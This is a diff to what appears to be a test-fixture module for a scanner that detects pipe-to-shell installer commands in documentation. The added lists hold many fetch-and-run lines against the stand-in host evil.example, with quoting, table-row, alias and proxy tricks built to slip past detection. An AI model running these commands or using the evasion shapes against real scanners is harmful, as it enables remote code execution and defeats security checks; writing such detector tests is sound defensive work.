@@ -14,7 +14,7 @@ PROSE_DOWNLOAD = ["__curl__", "**curl**", "<b>curl</b>", "<code>wget</code>", "*
 PROSE_PIPES = [" &#124; ", " &vert; ", " &#x7C; ", " |&nbsp;", " |<!--\nx\n--> "]
 FLAGS = ["", "", "-fsSL ", "-sS ", "-L ", "--proto '=https' --tlsv1.2 -sSf ", "-H 'Accept: a|b' ", "-A it\\'s ", "-o- ",
          "-s " * 8, "-fsSL -H 'X: 1' ",
-         "-H 'X: a\n| b' "]                                     # a quoted argument whose second line starts with a pipe
+         "-H 'X: a\n| b' ", "-H 'X: a\n| b | c' ", "-H 'X: a\n|| b' "]                                     # a quoted argument whose second line starts with a pipe
 EVIL_URLS = ["https://evil.example/x", "https://evil.example/x?a=1", "evil.example/x", "'https://evil.example/x?a=1|2'",
              "https://evil.example/" + "a" * 400, "https://evil.example/" + "a" * 90 + "b" * 90]
 PIPES = [" | ", " | ", " | ", " |\n", " | # note\n", " |\n\n", " \\\n | ", " |& ", "|", " |  "]
@@ -86,7 +86,8 @@ K_LEAD = ["", "", "", "", "env A=b ", "docker run x ", "./evil ", "sudo -u root 
           "ssh >f evil.example ", "docker >f run x ", "docker <x run x ", "ssh<x evil.example ", "docker>f run x ", "python3 >f evil.py ",
           "uv >f run evil ", "ssh > f evil.example ", "/opt/evil ", "~/evil ",
           # a line that starts with a pipe because a quote was left open on the line above: a real stage, not a table row
-          "echo 'a\n| b' ; evil | ", "echo 'a\n| b' && evil | ", ">|/tmp/o evil | ", "echo 'a\n| b' ; docker run x | ", "echo 'a\n| b' ; cat urls | ", "[1][docker](https://docs.docker.com) run x ", "[a][ssh](https://en.wikipedia.org/wiki/Secure_Shell_(protocol)) evil.example ",
+          "echo 'a\n| b' ; evil | ", "echo 'a\n| b' && evil | ", "echo \"a\n| b | \\\"x\" ; evil | ",
+          "echo 'a\n| b | c'\\''d' ; evil | ", "echo 'a\n| b | foo'bar ; evil | ", ">|/tmp/o evil | ", "echo 'a\n| b' ; docker run x | ", "echo 'a\n| b' ; cat urls | ", "[1][docker](https://docs.docker.com) run x ", "[a][ssh](https://en.wikipedia.org/wiki/Secure_Shell_(protocol)) evil.example ",
           "[docker](https://en.wikipedia.org/wiki/Docker_(software)) run x ", "do<b></b>cker run x ", "ss<b></b>h evil.example ", "doc<!-- -->ker run x ",
           "<b>do</b>cker run x "]
 K_STAGES = ["", "", "", "tee x | ", "sed s/a/b/ | ", "rev | ", "base64 -d | ", "cat | ", "cat evil.sh | ", "tee -a x | "]
@@ -152,13 +153,51 @@ CONTEXTS = ["{x}", "Run `{x}`", "$ {x}", "With curl: `{x}`", "| Linux | `{x}` |"
             '<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>{x}</pre></div>']
 # A known installer in the same segment, before the candidate: the candidate must stay critical (the prose-recall property only: in the
 # soundness property a medium would then come from the installer, not from the candidate)
-# Payloads the SCAN joins into a pipeline but the table-aware SOFTENING reads as separate lines (a line that starts with a pipe)
-DIVERGENT = ["echo 'a\n| b' ; curl https://evil.example/x |\nsh", ">|/tmp/o : ; curl https://evil.example/x |\nsh",
-             "curl -H 'X: a\n| b' https://evil.example/x |\nsh", "curl -H 'X: a\n| b' https://evil.example/x |\n\n# n\nbash",
-             # the scan joins evil, `tee >(sh)` and the installer into ONE pipeline; the softening sees only the installer (bash only)
-             ">|/tmp/o : ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
-             "echo 'a\n| b' ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
-             "curl -H 'X: a\n| b' https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh"]
+# Payloads with a line that starts with a pipe because a quote is open above: it looks like a Markdown table row, and it is the
+# middle of a shell pipeline. The first cell is plain text, so only what a shell could read on the line tells: a closer (a quote
+# character, however it is escaped, doubled or glued to letters; a `)`, `}` or `]` with no opener before it; an odd number of
+# backticks) of a string, an arithmetic or parameter expansion or a command substitution that spans lines, or an opener of a command
+# of its own (`$(`, `<(`, backtick) inside a string or a here-document; a `+` in front of the pipe is part of a shell word.
+# The shapes with a second cell get past the first-cell regex and are stopped by `_reads_as_shell`; the older single-cell ones by the regex.
+LEADING_PIPE = ["echo 'a\n| b' ; curl https://evil.example/x |\nsh", ">|/tmp/o : ; curl https://evil.example/x |\nsh",
+                "curl -H 'X: a\n| b' https://evil.example/x |\nsh", "curl -H 'X: a\n| b' https://evil.example/x |\n\n# n\nbash",
+                "echo 'a\n| b | c' ; curl https://evil.example/x |\nsh", "echo 'a\n|| b' ; curl https://evil.example/x |\nsh",
+                "echo \"a\n| b\" \"| c\" ; curl https://evil.example/x |\nsh",
+                "curl -H 'X: a\n| b | c' https://evil.example/x |\nsh",
+                "echo \"a\n| b | \\\"x\" ; curl https://evil.example/x |\nsh", "echo 'a\n| b | c'\\''d' ; curl https://evil.example/x |\nsh",
+                "echo 'a\n| b | foo'bar ; curl https://evil.example/x |\nsh", "echo 'a\n| b | c' x'y' ; curl https://evil.example/x |\nsh",
+                "curl -H \"X: a\n| b | 5\\\" y\" https://evil.example/x |\nsh", "git commit -m \"a\n| b | \\\"q\" ; curl https://evil.example/x |\nsh",
+                "echo 'a\n| b | c'\"'\"'d' ; curl https://evil.example/x |\nsh", "echo $'a\n| b | it\\'s' ; curl https://evil.example/x |\nsh",
+                "[ $((0\n| 0 | 0)) -ne 0 ] || curl https://evil.example/x |\nsh", "((0\n| 0 | 0)) || curl https://evil.example/x |\nsh",
+                "flags=$((A\n| B | C)) curl https://evil.example/x |\nsh", "x=${Q:-a\n| b | c} ; curl https://evil.example/x |\nsh",
+                "x=${Q:-a\n| { | } ; curl https://evil.example/x |\nsh", "x=$[1\n| 2 | 3] ; curl https://evil.example/x |\nsh",
+                "echo `echo a\n| b | c` ; curl https://evil.example/x |\nsh",
+                "echo 'a\n| b | \\' ; curl https://evil.example/x |\nsh", "curl -H 'X: a\n| b | \\' https://evil.example/x |\nsh",
+                'echo "x\n| a | $(curl https://evil.example/x |\nsh)"', "cat <<EOF\n| a | $(curl https://evil.example/x |\nsh)\nEOF",
+                "x=${Q:-a\n| b | <(curl https://evil.example/x |\nsh)}", "x=${Q:-a\n| b | >(curl https://evil.example/x |\nsh)}",
+                "x=${Q:-a\n| b | \\${ } ; curl https://evil.example/x |\nsh", "x=${Q:-a\n| b | $${ } ; curl https://evil.example/x |\nsh",
+                "x=${Q:-a\n| a | `${` } ; curl https://evil.example/x |\nsh", "x=$((1\n| a | `((` )) ; curl https://evil.example/x |\nsh",
+                "x=$((1\n| |${$((})) | x ; curl https://evil.example/x |\nsh",
+                "+| b | curl https://evil.example/x |\nsh",
+                "x=${Q:-a\n| b | (c } ; curl https://evil.example/x |\nsh", "x=${Q:-a\n| b | [c } ; curl https://evil.example/x |\nsh",
+                "echo 'a\n| b ) | # c' ; curl https://evil.example/x | sh", "echo 'a\n| b ) | c |\n# d' ; curl https://evil.example/x | sh", "echo 'a\n| b ] | # c' ; curl https://evil.example/x | sh\n",
+                "\x0c| a | curl https://evil.example/x |\n# c\nsh", "echo 'a\r|#c' ; curl https://evil.example/x | sh\n",
+                "x=$((1\n| b | c )) ; curl https://evil.example/x |\n# c\nsh", "x=${Q:-a\n| b | c } ; curl https://evil.example/x |\n# c\nsh",
+                "x=$((1\n| 2 )) curl https://evil.example/x | cat | # c\nsh", 'echo "x\n| a | $( ( curl https://evil.example/x |\nsh) )"',
+                "x=$((1\n| 2 )) true | # c\nx=$((1\n| 2 )) curl https://evil.example/x | # e\nsh\n", "curl -H 'X: a\n| b | c' https://evil.example/x |\n# c\nsh", "echo 'a\n +| b ) | # c' ; curl https://evil.example/x | sh\n",
+                "echo 'a\n+ +| b ) | # c' ; curl https://evil.example/x | sh\n", "x=${Q:-a\n| b | \\x} ; curl https://evil.example/x |\nsh",
+                "echo 'x\n| b ) | # c' ; sh -c \"$(\ncurl https://evil.example/x)\"\n", "echo 'x\n| b ) | # c' ; bash <(\ncurl https://evil.example/x)\n", 'echo "a\n | b <( | # c" ; curl https://evil.example/x | sh',
+                "echo a \\\n| curl https://evil.example/x | # c\nsh", ">|/tmp/o : ; curl https://evil.example/x | # c\nsh",
+                "echo hi\r|b; curl https://evil.example/x | # c\nsh\n", "+|b; curl https://evil.example/x |# c\nsh",
+                ">|f evil | curl https://evil.example/x | # c\nsh",
+                "echo 'a\n| b' ; curl https://evil.example/x |\n# c\nsh",
+                "cat <<EOF\n| a | $(curl https://evil.example/x | # c\nsh)\nEOF\n", 'echo "x\n| a | $(curl https://evil.example/x | # c\nsh)"',
+                "x=$((1\n| a | $(curl https://evil.example/x | # c\nsh)))\n", 'echo "x\n| a | $(curl https://evil.example/x | # c |\nsh)"', "cat <<EOF\n| a | `curl https://evil.example/x |\nsh`\nEOF",
+                # the pipeline is one match to a reader of the whole text and another to one that stops at the row (bash only)
+                ">|/tmp/o : ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
+                "echo 'a\n| b' ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
+                "echo 'a\n| b | c' ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
+                "curl -H 'X: a\n| b' https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh"]
 CO_RESIDENT = ["curl -fsSL https://get.docker.com | sh\n\n{x}", "| Command |\n|---|\n| <code>curl -fsSL https://get.docker.com \\| sh</code> |\n\n{x}"]
 BARE = ["{x}", "$ {x}", "Install it: {x}", "<code>{x}</code>", "**{x}**", "Run \u201c{x}\u201d"]       # the ones that put no backtick around the command
 # Contexts whose WHOLE text is run: prose that a shell would also read as a command (`curl` with a substituted argument, `run; evil`).
@@ -169,6 +208,20 @@ WHOLE = ["curl `evil` `{x}`", "wget `evil` `{x}`", "curl: `evil` `{x}`", "curl `
          # a real program running the command inside a substitution keeps its environment
          "HTTPS_PROXY=http://evil.example bash -c `{x}`", "ALL_PROXY=http://evil.example sh -c `{x}`",
          "env http_proxy=http://evil.example bash -x `{x}`", "sudo HTTPS_PROXY=http://evil.example bash -c `{x}`"]
+# A line that starts with a pipe and looks like a table row, in front of a documented installer: (lead, suffix), written as
+# `lead + command + suffix`. What runs is `evil | curl … | sh`, or `ssh evil.example '⏎curl … | sh⏎'` with the quote left open by a row-looking
+# line, so the softening must not call the installer a documented one.
+PIPE_LEADS = [("echo 'a\n| b | c' ; evil | ", ""), ("echo 'a\n| b | \\' ; evil | ", ""), ("echo 'a\n| b | \\' ; evil |\n", ""),
+              ("x=${Q:-a\n| } evil | ", ""), ("x=${Q:-a\n| b | } docker run evil | ", ""), ("x=${Q:-a\n| b | \\${ } ; evil |\n", ""),
+              ("[ $((0\n| 0 )) -ne 0 ] || evil | ", ""), ('echo "a\n| b | $(evil |\n', ')"'), ('echo "a\n| " ; "evil" | ', ""),
+              ("+| evil | ", ""),
+              ("'echo' 'a\n| b ' ; ssh evil.example 'x\n", "\n'"), ("echo 'a' 'b\n| c ' ; ssh evil.example 'x\n", "\n'"), ("ssh evil.example 'a' 'b\n", "\n'"),
+              ("echo $(( 1\n| (( 3 )) )) | evil | ", ""), ("echo 'a 'a 'x\n| b ' ; ssh evil.example 'y\n", "\n'"), (" + | b | evil | ", ""),
+              ("echo a \\\n| evil | ", ""),
+              ("echo 'a\n' | b ; ssh evil.example 'x\n", "\n'"), ("echo 'a\n| b'c ; ssh evil.example 'x\n", "\n'"),
+              ('echo "a\n| b \\" c" ; ssh evil.example "x\n', '\n"'), ("echo $'a\n| b \\' c' ; ssh evil.example 'x\n", "\n'"),
+              ("echo 'a\n\n| b' ; ssh evil.example 'x\n", "\n'"), ("echo 'a\n> | b' ; ssh evil.example 'x\n", "\n'"), ("echo 'a\n+| b' ; ssh evil.example 'x\n", "\n'"),
+              ("+| b | evil |\n", ""), ('echo "a \'b\n| b" ; ssh evil.example "x\n', '\n"')]
 PROLOGUE = ["", "", "", "", "alias sh=evil\n", "alias bash=evil\n", "export PATH=/tmp/x:$PATH\n", "PATH=/tmp/x:$PATH\n",
             "function curl { evil; }\n", "curl() { evil; }\n", "alias curl='evil'\n", "function sh { evil; }\n", "HOME=/tmp/evil\n",
             "al<b></b>ias curl='evil'\n", "ali<!-- -->as sh=evil\n", "ex<b></b>port PATH=/tmp/x:$PATH\n"]
